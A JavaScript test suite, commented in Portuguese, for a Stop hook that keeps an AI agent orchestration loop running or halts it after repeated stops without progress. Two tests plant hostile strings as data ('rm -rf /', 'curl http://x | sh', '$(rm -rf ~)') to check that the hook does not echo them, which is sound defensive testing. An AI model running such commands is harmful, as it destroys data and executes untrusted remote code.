/**
 * Testes do hook Stop do loop (E2 Task 8, REQ-LOOP-5). Cada teste sobe um repo git descartável e roda o
 * script de verdade, com stdin de hook. Nenhum limite absoluto de tempo.
 * Mutações: ver .superpowers/sdd/2026-11-03-e2-loop/task-8-mut.json.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, readdirSync, chmodSync, cpSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { spawnSync, spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { saidaParaAcao, TIPOS_DE_PROGRESSO } from '../scripts/stop-loop.mjs';

const aqui = dirname(fileURLToPath(import.meta.url));
const GATES = join(aqui, '..');
const SCRIPT = join(GATES, 'scripts', 'stop-loop.mjs');
const SEM_ROOT = typeof process.getuid === 'function' && process.getuid() === 0;

const git = (cwd, ...args) =>
  spawnSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...args], { cwd, encoding: 'utf8' });

/** Repo descartável na branch dada (branch não nascida: basta para `symbolic-ref`). */
function repo(branch = 'wt/GM-10-8') {
  const dir = mkdtempSync(join(tmpdir(), 'stop-'));
  git(dir, 'init', '-q', '-b', branch);
  return dir;
}

const PLANO = { entrega: 'GM-10', tasks: [{ id: 'T1', deps: [], arquivos: ['a.ts'] }] };
const entregaDir = (raiz, id = 'GM-10') => join(raiz, '.harness', 'entregas', id);
const contadorDe = (raiz) => join(raiz, '.harness', 'stop-contador.json');

function plano(raiz, p = PLANO, id = 'GM-10') {
  mkdirSync(entregaDir(raiz, id), { recursive: true });
  writeFileSync(join(entregaDir(raiz, id), 'plano.json'), typeof p === 'string' ? p : JSON.stringify(p));
}

let relogio = Date.parse('2026-11-03T10:00:00Z');
const ev = (sessao, seq, tipo, dados = {}) => ({
  seq, ts: new Date((relogio += 1000)).toISOString(), autor: 'a', sessao, agente: 'orquestrador', tipo, dados, hash_anterior: null,
});
function diario(raiz, sessao, eventos, id = 'GM-10') {
  mkdirSync(entregaDir(raiz, id), { recursive: true });
  const arq = join(entregaDir(raiz, id), `events.${sessao}.jsonl`);
  const antes = existsSync(arq) ? readFileSync(arq, 'utf8') : '';
  writeFileSync(arq, antes + eventos.map((e) => JSON.stringify(e)).join('\n') + '\n');
}
/** Uma linha qualquer e válida, de tipo que NÃO é progresso (a guarda grava isso a cada tentativa barrada). */
let seqAvulso = 0;
const linhaAvulsa = (raiz, sessao = 'avulsa', id = 'GM-10') =>
  diario(raiz, sessao, [ev(sessao, ++seqAvulso, 'guarda.ask', { alvo: 'x' })], id);

/** Evento de progresso que não muda a ação pendente de T1: `ci.resultado` verde (`proximaAcao` o consome). */
const progresso = (raiz, sessao = 'prog', id = 'GM-10') =>
  diario(raiz, sessao, [ev(sessao, ++seqAvulso, 'ci.resultado', { verde: true })], id);

const TASK_APROVADA = (sessao = 's') => [
  ev(sessao, 1, 'task.iniciada', { task: 'T1', papel: 'implementador' }),
  ev(sessao, 2, 'task.concluida', { task: 'T1' }),
  ev(sessao, 3, 'review.veredito', { task: 'T1', veredito: 'APROVADO', rodada: 1, major: 0, blocker: 0 }),
];

const env = (extra = {}) => {
  const limpo = { ...process.env };
  for (const k of Object.keys(limpo)) if (k.startsWith('GABARITO_') || k === 'CLAUDE_PROJECT_DIR') delete limpo[k];
  return { ...limpo, ...extra };
};

function stop(raiz, entrada = {}, opts = {}) {
  const input = opts.input !== undefined ? opts.input : JSON.stringify({ session_id: 'S1', cwd: raiz, background_tasks: [], ...entrada });
  const r = spawnSync(process.execPath, [opts.script ?? SCRIPT], {
    cwd: opts.cwd ?? raiz, input, encoding: 'utf8', env: env({ CLAUDE_PROJECT_DIR: raiz, ...(opts.env ?? {}) }),
  });
  let json = null;
  try { json = r.stdout.trim() === '' ? null : JSON.parse(r.stdout); } catch { /* fica null */ }
  return { rc: r.status, stdout: r.stdout, stderr: r.stderr, json };
}

const mudo = (r) => {
  assert.equal(r.rc, 0, r.stderr);
  assert.equal(r.stdout, '');
  assert.equal(r.stderr, '');
};
const avisa = (r, re) => {
  assert.equal(r.rc, 0, r.stderr);
  assert.ok(r.json, `esperava JSON, veio: ${r.stdout}`);
  assert.equal(r.json.decision, undefined, 'aviso nunca é block');
  assert.match(r.json.systemMessage, re);
};
const bloqueia = (r, re) => {
  assert.equal(r.rc, 0, r.stderr);
  assert.ok(r.json, `esperava JSON, veio: ${r.stdout}`);
  assert.equal(r.json.decision, 'block');
  if (re) assert.match(r.json.reason, re);
};
const contador = (raiz) => JSON.parse(readFileSync(contadorDe(raiz), 'utf8'));
const linhasDoDiario = (raiz, id = 'GM-10') =>
  readdirSync(entregaDir(raiz, id)).filter((n) => /^events\..+\.jsonl$/.test(n))
    .flatMap((n) => readFileSync(join(entregaDir(raiz, id), n), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)));

// ------------------------------------------------------------------------------------- linha 1: stdin

test('stop-stdin-ausente-avisa', () => {
  const raiz = repo();
  plano(raiz);
  avisa(stop(raiz, {}, { input: '' }), /stdin/i);
});

test('stop-stdin-json-invalido-avisa', () => {
  const raiz = repo();
  plano(raiz);
  const r = stop(raiz, {}, { input: '{nao json' });
  avisa(r, /JSON/);
  assert.ok(!r.stdout.includes('nao json'), 'não repete o conteúdo recebido');
});

test('stop-stdin-nao-objeto-avisa', () => {
  const raiz = repo();
  avisa(stop(raiz, {}, { input: '[1,2]' }), /objeto/);
});

// ------------------------------------------------------------------------------------- linha 2: fora de loop

test('stop-sem-plano-sai', () => {
  const raiz = repo();
  mudo(stop(raiz));
  assert.equal(existsSync(contadorDe(raiz)), false, 'fora de loop não cria o contador');
  assert.equal(existsSync(join(raiz, '.harness')), false, 'fora de loop não cria nada em .harness');
});

test('stop-sem-card-sai', () => {
  const raiz = repo('main');
  plano(raiz);
  mudo(stop(raiz));
  assert.equal(existsSync(contadorDe(raiz)), false);
});

test('stop-branch-wt-sem-numero-sai: wt/GM-10-x não tem card', () => {
  const raiz = repo('wt/GM-10-x');
  plano(raiz);
  mudo(stop(raiz));
});

test('stop-head-destacado-sai', () => {
  const raiz = repo('main');
  git(raiz, 'commit', '-q', '--allow-empty', '-m', 'x');
  git(raiz, 'checkout', '-q', '--detach');
  plano(raiz);
  mudo(stop(raiz));
});

test('stop-fora-de-git-sai', () => {
  const dir = mkdtempSync(join(tmpdir(), 'stop-nogit-'));
  mudo(stop(dir, { cwd: dir }));
});

test('stop-branch-feature-com-card-acha-a-entrega', () => {
  const raiz = repo('enabler/GM-10-loop-pouso');
  plano(raiz);
  bloqueia(stop(raiz), /T1/);
});

test('stop-branch-wt-com-card-acha-a-entrega', () => {
  const raiz = repo('wt/GM-10-8');
  plano(raiz);
  bloqueia(stop(raiz), /T1/);
});

test('stop-plano-de-outra-entrega-nao-vale', () => {
  const raiz = repo('wt/GM-10-8');
  plano(raiz, { ...PLANO, entrega: 'GM-11' }, 'GM-11');
  mudo(stop(raiz));
});

test('stop-cwd-do-stdin-resolve-a-raiz-sem-CLAUDE_PROJECT_DIR', () => {
  const raiz = repo();
  plano(raiz);
  const r = spawnSync(process.execPath, [SCRIPT], {
    cwd: tmpdir(), input: JSON.stringify({ session_id: 'S1', cwd: raiz, background_tasks: [] }), encoding: 'utf8', env: env(),
  });
  assert.equal(JSON.parse(r.stdout).decision, 'block');
});

// ------------------------------------------------------------------------------------- linha 3: plano inválido

test('stop-plano-corrompido-nao-bloqueia', () => {
  const raiz = repo();
  plano(raiz, '{ isto nao e json SEGREDO-NO-ARQUIVO');
  const r = stop(raiz);
  avisa(r, /plano/i);
  assert.ok(!r.stdout.includes('SEGREDO-NO-ARQUIVO'), 'não ecoa o conteúdo do arquivo');
});

test('stop-plano-invalido-nao-bloqueia', () => {
  const raiz = repo();
  plano(raiz, { entrega: 'GM-10', tasks: [{ id: 'a', deps: ['b'], arquivos: [] }, { id: 'b', deps: ['a'], arquivos: [] }] });
  avisa(stop(raiz), /ciclo/);
});

test('stop-plano-ilegivel-nao-bloqueia: plano.json é um diretório', () => {
  const raiz = repo();
  mkdirSync(join(entregaDir(raiz), 'plano.json'), { recursive: true });
  avisa(stop(raiz), /plano/i);
});

test('stop-plano-invalido-vence-agente-vivo: a linha 3 vem antes da 4', () => {
  const raiz = repo();
  plano(raiz, '{ruim');
  avisa(stop(raiz, { background_tasks: [{ type: 'subagent' }] }), /plano/i);
});

test('stop-plano-editado-no-meio-preserva-contador', () => {
  const raiz = repo();
  plano(raiz);
  bloqueia(stop(raiz));
  const antes = readFileSync(contadorDe(raiz), 'utf8');
  plano(raiz, '{quebrou');
  avisa(stop(raiz), /plano/i);
  assert.equal(readFileSync(contadorDe(raiz), 'utf8'), antes);
});

// ------------------------------------------------------------------------------------- linha 4: agente vivo

test('stop-agente-vivo-nao-bloqueia', () => {
  const raiz = repo();
  plano(raiz);
  mudo(stop(raiz, { background_tasks: [{ id: 'a', type: 'subagent', status: 'running' }] }));
  assert.equal(existsSync(contadorDe(raiz)), false, 'agente vivo não mexe no contador');
});

test('stop-shell-background-nao-conta', () => {
  const raiz = repo();
  plano(raiz);
  bloqueia(stop(raiz, { background_tasks: [{ id: 'sh', type: 'shell', status: 'running' }] }));
});

test('stop-shell-e-agente-juntos: o agente conta', () => {
  const raiz = repo();
  plano(raiz);
  mudo(stop(raiz, { background_tasks: [{ type: 'shell' }, { type: 'subagent' }] }));
});

test('stop-background-tasks-ausente-ou-torto-nao-conta', () => {
  const raiz = repo();
  plano(raiz);
  bloqueia(stop(raiz, { background_tasks: undefined }));
  bloqueia(stop(raiz, { background_tasks: 'subagent' }));
  bloqueia(stop(raiz, { background_tasks: [null, 3, 'x'] }));
});

// ------------------------------------------------------------------------------------- linha 5: PAUSAR

test('stop-pausado-sai', () => {
  const raiz = repo();
  plano(raiz);
  mkdirSync(join(raiz, '.harness'), { recursive: true });
  writeFileSync(join(raiz, '.harness', 'PAUSAR'), '');
  mudo(stop(raiz));
});

test('stop-pausado-no-checkout-principal-sai', () => {
  const principal = repo('main');
  git(principal, 'commit', '-q', '--allow-empty', '-m', 'x');
  const wt = join(mkdtempSync(join(tmpdir(), 'stop-wt-')), 'wt');
  const r = git(principal, 'worktree', 'add', '-q', '-b', 'wt/GM-10-2', wt);
  assert.equal(r.status, 0, r.stderr);
  plano(wt);
  bloqueia(stop(wt)); // sem PAUSAR: o loop vale
  mkdirSync(join(principal, '.harness'), { recursive: true });
  writeFileSync(join(principal, '.harness', 'PAUSAR'), '');
  mudo(stop(wt));
});

// ------------------------------------------------------------------------------------- linha 6: loop.parar

test('stop-parar-gravado-sai', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 'S1', [ev('S1', 1, 'loop.parar', { motivo: 'teto_rodadas' })]);
  mudo(stop(raiz));
});

test('stop-evento-depois-do-parar-religa', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 'S1', [ev('S1', 1, 'loop.parar', { motivo: 'sem_progresso' })]);
  mudo(stop(raiz));
  diario(raiz, 'humano', [ev('humano', 1, 'task.reaberta', { task: 'T1', origem: 'dono' })]);
  bloqueia(stop(raiz), /T1/);
});

test('stop-evento-que-nao-e-de-task-depois-do-parar-nao-religa', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 'S1', [ev('S1', 1, 'loop.parar', { motivo: 'sem_progresso' })]);
  linhaAvulsa(raiz);
  mudo(stop(raiz));
});

test('stop-evento-de-task-antes-do-parar-nao-religa', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 'S1', [
    ev('S1', 1, 'task.iniciada', { task: 'T1', papel: 'implementador' }),
    ev('S1', 2, 'loop.parar', { motivo: 'nao_conseguiu' }),
  ]);
  mudo(stop(raiz));
});

// ------------------------------------------------------------------------------------- linha 7: diário ilegível

test('stop-diario-com-linha-ilegivel-avisa', () => {
  const raiz = repo();
  plano(raiz);
  mkdirSync(entregaDir(raiz), { recursive: true });
  writeFileSync(join(entregaDir(raiz), 'events.S1.jsonl'), '{"seq":1,\n');
  const r = stop(raiz);
  avisa(r, /di[aá]rio/i);
  assert.equal(existsSync(contadorDe(raiz)), false);
});

test('stop-diario-ilegivel-nunca-vira-concluir: com tudo integrado e uma linha torta, avisa e não cala', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 's', [...TASK_APROVADA(), ev('s', 4, 'task.integrada', { task: 'T1' })]);
  writeFileSync(join(entregaDir(raiz), 'events.torto.jsonl'), 'lixo\n');
  avisa(stop(raiz), /di[aá]rio/i);
});

test('stop-diario-arquivo-nao-legivel-avisa: events.*.jsonl é um diretório', () => {
  const raiz = repo();
  plano(raiz);
  mkdirSync(join(entregaDir(raiz), 'events.S1.jsonl'), { recursive: true });
  avisa(stop(raiz), /di[aá]rio/i);
});

test('stop-diario-com-evento-fora-do-contrato-avisa: task desconhecida ⇒ parar diario_invalido, sem gravar', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 's', [ev('s', 1, 'task.iniciada', { task: 'T9', papel: 'implementador' })]);
  const antes = linhasDoDiario(raiz).length;
  avisa(stop(raiz), /diario_invalido/);
  assert.equal(linhasDoDiario(raiz).length, antes, 'parar de proximaAcao não grava');
});

test('stop-diario-ts-invalido-avisa', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 's', [{ ...ev('s', 1, 'guarda.ask'), ts: 'ontem' }]);
  avisa(stop(raiz), /diario_invalido/);
});

// ------------------------------------------------------------------------------------- linha 8: ações

test('stop-concluir-sai', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 's', [...TASK_APROVADA(), ev('s', 4, 'task.integrada', { task: 'T1' })]);
  mudo(stop(raiz));
  assert.equal(existsSync(contadorDe(raiz)), false, 'concluir não grava contador');
});

test('stop-esperar-sai: a ação esperar é silêncio (função pura)', () => {
  assert.equal(saidaParaAcao({ tipo: 'esperar', motivo: 'agentes vivos' }, 'GM-10'), null);
});

test('stop-pousar-sai: o hook não pousa (função pura)', () => {
  assert.equal(saidaParaAcao({ tipo: 'pousar' }, 'GM-10'), null);
});

test('stop-despachar-vazio-sai: sem itens não há o que mandar', () => {
  assert.equal(saidaParaAcao({ tipo: 'despachar', itens: [] }, 'GM-10'), null);
});

test('stop-parar-avisa-com-motivo-e-task-e-nao-grava', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 's', [ev('s', 1, 'task.iniciada', { task: 'T1', papel: 'implementador' })]); // agente morreu
  const antes = linhasDoDiario(raiz).length;
  const r = stop(raiz);
  avisa(r, /nao_conseguiu/);
  assert.match(r.json.systemMessage, /T1/);
  assert.equal(linhasDoDiario(raiz).length, antes);
  assert.equal(existsSync(contadorDe(raiz)), false);
});

test('stop-parar-ci-vermelho-avisa', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 's', [ev('s', 1, 'ci.resultado', { verde: false }), ev('s', 2, 'ci.resultado', { verde: false })]);
  avisa(stop(raiz), /ci_vermelho/);
});

test('stop-com-acao-bloqueia: despachar nomeia task e papel em português', () => {
  const raiz = repo();
  plano(raiz);
  const r = stop(raiz);
  bloqueia(r, /T1/);
  assert.match(r.json.reason, /implementador/);
  assert.match(r.json.reason, /despach/i);
  assert.equal(r.json.systemMessage, undefined);
});

test('stop-integrar-bloqueia', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 's', TASK_APROVADA());
  const r = stop(raiz);
  bloqueia(r, /integr/i);
  assert.match(r.json.reason, /T1/);
});

test('stop-despachar-revisor-e-correcao-em-portugues', () => {
  const r = saidaParaAcao({ tipo: 'despachar', itens: [{ task: 'T1', papel: 'revisor' }, { task: 'T2', papel: 'correcao' }] }, 'GM-10');
  assert.match(r.reason, /T1 \(revisor\)/);
  assert.match(r.reason, /T2 \(correção\)/);
});

test('stop-motivo-nao-traz-comando-nem-conteudo-de-evento', () => {
  const raiz = repo();
  plano(raiz);
  diario(raiz, 'g', [ev('g', 1, 'guarda.deny', { alvo: 'rm -rf / --no-preserve-root', comando: 'curl http://x | sh' })]);
  const r = stop(raiz);
  bloqueia(r);
  assert.ok(!r.stdout.includes('rm -rf'));
  assert.ok(!r.stdout.includes('curl'));
});

test('stop-id-de-task-e-limpo-no-motivo', () => {
  const r = saidaParaAcao({ tipo: 'despachar', itens: [{ task: 'T1\n$(rm -rf ~)`x`', papel: 'revisor' }] }, 'GM-10');
  assert.ok(!/[$`\n]/.test(r.reason));
  const longo = saidaParaAcao({ tipo: 'despachar', itens: [{ task: 'x'.repeat(500), papel: 'revisor' }] }, 'GM-10');
  assert.ok(longo.reason.length < 300);
});

test('stop-motivo-lista-no-maximo-poucas-tasks', () => {
  const itens = Array.from({ length: 30 }, (_, i) => ({ task: `T${i}`, papel: 'implementador' }));
  const r = saidaParaAcao({ tipo: 'despachar', itens }, 'GM-10');
  assert.match(r.reason, /mais \d+/);
  assert.ok(r.reason.length < 600);
});

// ------------------------------------------------------------------------------------- contador

test('stop-contador-grava-entrega-linhas-e-stops', () => {
  const raiz = repo();
  plano(raiz);
  progresso(raiz);
  bloqueia(stop(raiz));
  assert.deepEqual(contador(raiz), { entrega: 'GM-10', linhas: 1, stops: 0 });
  bloqueia(stop(raiz));
  assert.deepEqual(contador(raiz), { entrega: 'GM-10', linhas: 1, stops: 1 });
  assert.equal(readdirSync(join(raiz, '.harness')).filter((n) => n.endsWith('.tmp')).length, 0, 'sem temporário sobrando');
});

test('stop-3-sem-progresso-para: grava loop.parar, avisa e sai sem block', () => {
  const raiz = repo();
  plano(raiz);
  bloqueia(stop(raiz)); // linha de base
  bloqueia(stop(raiz)); // 1 sem linha nova
  bloqueia(stop(raiz)); // 2
  const antes = linhasDoDiario(raiz).length;
  const r = stop(raiz); // 3
  avisa(r, /Gravei loop\.parar/);
  assert.equal(r.json.decision, undefined);
  const depois = linhasDoDiario(raiz);
  assert.equal(depois.length, antes + 1);
  const parar = depois.find((e) => e.tipo === 'loop.parar');
  assert.equal(parar.dados.motivo, 'sem_progresso');
  assert.equal(parar.sessao, 'S1');
  assert.equal(parar.agente, 'orquestrador');
  mudo(stop(raiz)); // depois do parar: silêncio
});

test('stop-1-e-2-sem-progresso-ainda-bloqueiam', () => {
  const raiz = repo();
  plano(raiz);
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  assert.equal(contador(raiz).stops, 2);
  assert.equal(linhasDoDiario(raiz).filter((e) => e.tipo === 'loop.parar').length, 0);
});

test('stop-linha-nova-zera', () => {
  const raiz = repo();
  plano(raiz);
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  assert.equal(contador(raiz).stops, 2);
  progresso(raiz);
  bloqueia(stop(raiz)); // sem o evento de progresso, este seria o 3º sem progresso e pararia
  assert.equal(contador(raiz).stops, 0);
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  assert.equal(contador(raiz).stops, 2);
});

test('stop-linha-nova-de-outra-entrega-nao-zera', () => {
  const raiz = repo();
  plano(raiz);
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  diario(raiz, 'outra', [ev('outra', 1, 'ci.resultado', { verde: true })], 'GM-99');
  bloqueia(stop(raiz));
  assert.equal(contador(raiz).stops, 2);
});

test('stop-sessoes-multiplas-somam', () => {
  const raiz = repo();
  plano(raiz);
  const ci = (s, n) => ev(s, n, 'ci.resultado', { verde: true });
  diario(raiz, 'a', [ci('a', 1)]);
  diario(raiz, 'b', [ci('b', 1), ci('b', 2)]);
  bloqueia(stop(raiz));
  assert.equal(contador(raiz).linhas, 3);
  diario(raiz, 'c', [ev('c', 1, 'ci.resultado', { verde: true })]); // só a 3ª sessão cresceu
  bloqueia(stop(raiz));
  assert.deepEqual(contador(raiz), { entrega: 'GM-10', linhas: 4, stops: 0 });
});

test('stop-contador-de-outra-entrega-recomeca-sem-aviso', () => {
  const raiz = repo();
  plano(raiz);
  mkdirSync(join(raiz, '.harness'), { recursive: true });
  writeFileSync(contadorDe(raiz), JSON.stringify({ entrega: 'GM-77', linhas: 0, stops: 2 }));
  const r = stop(raiz);
  bloqueia(r);
  assert.equal(r.json.systemMessage, undefined);
  assert.deepEqual(contador(raiz), { entrega: 'GM-10', linhas: 0, stops: 0 });
});

for (const [nome, conteudo] of [
  ['json-torto', '{nao'],
  ['nao-objeto', '[1]'],
  ['stops-negativo', JSON.stringify({ entrega: 'GM-10', linhas: 0, stops: -1 })],
  ['linhas-texto', JSON.stringify({ entrega: 'GM-10', linhas: 'x', stops: 0 })],
  ['stops-fracao', JSON.stringify({ entrega: 'GM-10', linhas: 0, stops: 1.5 })],
]) {
  test(`stop-contador-corrompido-recomeca-com-aviso: ${nome}`, () => {
    const raiz = repo();
    plano(raiz);
    mkdirSync(join(raiz, '.harness'), { recursive: true });
    writeFileSync(contadorDe(raiz), conteudo);
    const r = stop(raiz);
    bloqueia(r, /T1/);
    assert.match(r.json.systemMessage, /contador/i);
    assert.deepEqual(contador(raiz), { entrega: 'GM-10', linhas: 0, stops: 0 });
  });
}

test('stop-contador-que-nao-grava-nao-bloqueia', { skip: SEM_ROOT }, () => {
  const raiz = repo();
  plano(raiz);
  mkdirSync(join(raiz, '.harness'), { recursive: true });
  chmodSync(join(raiz, '.harness'), 0o500);
  try {
    const r = stop(raiz);
    avisa(r, /contador/i);
  } finally {
    chmodSync(join(raiz, '.harness'), 0o700);
  }
});

test('stop-contador-ilegivel-por-ser-diretorio-nao-prende', () => {
  const raiz = repo();
  plano(raiz);
  mkdirSync(contadorDe(raiz), { recursive: true });
  avisa(stop(raiz), /contador/i);
});

test('stop-parar-que-nao-grava-nao-bloqueia', { skip: SEM_ROOT }, () => {
  const raiz = repo();
  plano(raiz);
  mkdirSync(join(raiz, '.harness'), { recursive: true });
  writeFileSync(contadorDe(raiz), JSON.stringify({ entrega: 'GM-10', linhas: 0, stops: 2 }));
  chmodSync(entregaDir(raiz), 0o500);
  try {
    const r = stop(raiz);
    avisa(r, /N[ÃA]O consegui gravar loop\.parar/);
  } finally {
    chmodSync(entregaDir(raiz), 0o700);
  }
});

test('stop-session-id-invalido-grava-parar-com-sessao-propria', () => {
  const raiz = repo();
  plano(raiz);
  mkdirSync(join(raiz, '.harness'), { recursive: true });
  writeFileSync(contadorDe(raiz), JSON.stringify({ entrega: 'GM-10', linhas: 0, stops: 2 }));
  avisa(stop(raiz, { session_id: '../../etc/x' }), /progresso/);
  const parar = linhasDoDiario(raiz).find((e) => e.tipo === 'loop.parar');
  assert.equal(parar.sessao, 'stop-loop');
  assert.ok(!existsSync(join(raiz, '.harness', 'etc')));
});

test('stop-dois-processos-nao-corrompem-o-contador', async () => {
  const raiz = repo();
  plano(raiz);
  const rodar = () => new Promise((ok) => {
    const p = spawn(process.execPath, [SCRIPT], { cwd: raiz, env: env({ CLAUDE_PROJECT_DIR: raiz }) });
    p.stdin.end(JSON.stringify({ session_id: 'S1', cwd: raiz, background_tasks: [] }));
    let out = '';
    p.stdout.on('data', (d) => { out += d; });
    p.on('close', (rc) => ok({ rc, out }));
  });
  const rs = await Promise.all(Array.from({ length: 8 }, rodar));
  for (const r of rs) assert.equal(r.rc, 0);
  const c = contador(raiz); // lança se o JSON estiver corrompido
  assert.equal(c.entrega, 'GM-10');
  assert.ok(Number.isInteger(c.stops) && c.stops >= 0);
});

// ------------------------------------------------------------------------------------- dist ausente

function copiaSemDist(removerTudo = true, manter = []) {
  const dest = mkdtempSync(join(tmpdir(), 'stop-copia-'));
  mkdirSync(join(dest, 'scripts'), { recursive: true });
  cpSync(SCRIPT, join(dest, 'scripts', 'stop-loop.mjs'));
  cpSync(join(GATES, 'lib'), join(dest, 'lib'), { recursive: true });
  if (!removerTudo || manter.length) {
    mkdirSync(join(dest, 'dist'), { recursive: true });
    for (const n of manter) cpSync(join(GATES, 'dist', n), join(dest, 'dist', n));
  }
  return join(dest, 'scripts', 'stop-loop.mjs');
}

test('stop-dist-plano-ausente-avisa-sem-excecao', () => {
  const raiz = repo();
  plano(raiz);
  const r = stop(raiz, {}, { script: copiaSemDist(true) });
  avisa(r, /dist/);
  assert.equal(r.stderr, '');
});

test('stop-dist-loop-ausente-avisa-sem-excecao', () => {
  const raiz = repo();
  plano(raiz);
  const r = stop(raiz, {}, { script: copiaSemDist(false, ['plano.js', 'diario.js']) });
  avisa(r, /dist/);
  assert.equal(r.stderr, '');
});

test('stop-dist-diario-ausente-avisa-sem-excecao', () => {
  const raiz = repo();
  plano(raiz);
  const r = stop(raiz, {}, { script: copiaSemDist(false, ['plano.js', 'loop.js']) });
  avisa(r, /dist/);
  assert.equal(r.stderr, '');
});

test('stop-dist-ausente-fora-de-loop-continua-mudo', () => {
  const raiz = repo();
  mudo(stop(raiz, {}, { script: copiaSemDist(true) }));
});

// ------------------------------------------------------------------------------------- contrato

test('stop-saida-e-uma-unica-linha-json-e-rc-zero-sempre', () => {
  const raiz = repo();
  plano(raiz);
  const r = stop(raiz);
  assert.equal(r.rc, 0);
  assert.equal(r.stdout.trim().split('\n').length, 1);
});

// ------------------------------------------------------------------------------------- só progresso zera (REQ-LOOP-5, emenda)

test('stop-guarda-ask-nao-zera', () => {
  const raiz = repo();
  plano(raiz);
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  linhaAvulsa(raiz); // guarda.ask entre os Stops
  bloqueia(stop(raiz));
  assert.equal(contador(raiz).stops, 2, 'guarda.ask não zera');
});

test('stop-custo-medicao-nao-zera', () => {
  const raiz = repo();
  plano(raiz);
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  diario(raiz, 'mod', [ev('mod', 1, 'custo.medicao', { tokens: 10 }), ev('mod', 2, 'guarda.heartbeat', {})]);
  bloqueia(stop(raiz));
  assert.equal(contador(raiz).stops, 2, 'custo.medicao e heartbeat não zeram');
});

test('stop-evento-de-task-zera', () => {
  const raiz = repo();
  plano(raiz, { entrega: 'GM-10', tasks: [{ id: 'T1', deps: [], arquivos: ['a.ts'] }, { id: 'T2', deps: [], arquivos: ['b.ts'] }] });
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  assert.equal(contador(raiz).stops, 2);
  diario(raiz, 's', [ev('s', 1, 'task.iniciada', { task: 'T1', papel: 'implementador' })]);
  bloqueia(stop(raiz), /T2/);
  assert.equal(contador(raiz).stops, 0);
});

test('stop-linha-corrompida-nao-zera: nem derruba o hook', () => {
  const raiz = repo();
  plano(raiz);
  bloqueia(stop(raiz));
  bloqueia(stop(raiz));
  const arq = join(entregaDir(raiz), 'events.torto.jsonl');
  writeFileSync(arq, '{"tipo":"ci.resultado","dados":{"verde":tr\n');
  const r = stop(raiz);
  avisa(r, /ilegível/);
  assert.equal(contador(raiz).stops, 1, 'contador intocado');
  writeFileSync(arq, '');
  bloqueia(stop(raiz));
  assert.equal(contador(raiz).stops, 2, 'linha torta não virou progresso');
});

test('stop-lista-progresso-igual-loop: a lista do hook é a que proximaAcao consome', () => {
  const fonte = readFileSync(join(GATES, 'src', 'loop.ts'), 'utf8');
  const m = fonte.match(/const TIPOS_DE_TASK[^=]*=\s*\[([^\]]*)\]/);
  assert.ok(m, 'loop.ts perdeu TIPOS_DE_TASK');
  const deTask = [...m[1].matchAll(/'([^']+)'/g)].map((x) => x[1]);
  assert.ok(/e\.tipo === 'ci\.resultado'/.test(fonte), 'loop.ts deixou de consumir ci.resultado');
  assert.deepEqual([...TIPOS_DE_PROGRESSO].sort(), [...deTask, 'ci.resultado'].sort());
});

test('stop-8-stops-com-acao-barrada-termina-em-loop-parar', () => {
  const raiz = repo();
  plano(raiz);
  const saidas = [];
  for (let i = 0; i < 8; i++) {
    linhaAvulsa(raiz); // a guarda grava guarda.ask a cada tentativa barrada, entre os Stops
    saidas.push(stop(raiz));
  }
  assert.equal(linhasDoDiario(raiz).filter((e) => e.tipo === 'loop.parar').length, 1);
  assert.ok(saidas.slice(0, 3).every((r) => r.json?.decision === 'block'));
  assert.equal(saidas[3].json.decision, undefined, 'o 4º Stop (3 sem progresso) já para');
  assert.match(saidas[3].json.systemMessage, /Gravei loop\.parar/);
  for (const r of saidas.slice(4)) mudo(r);
});
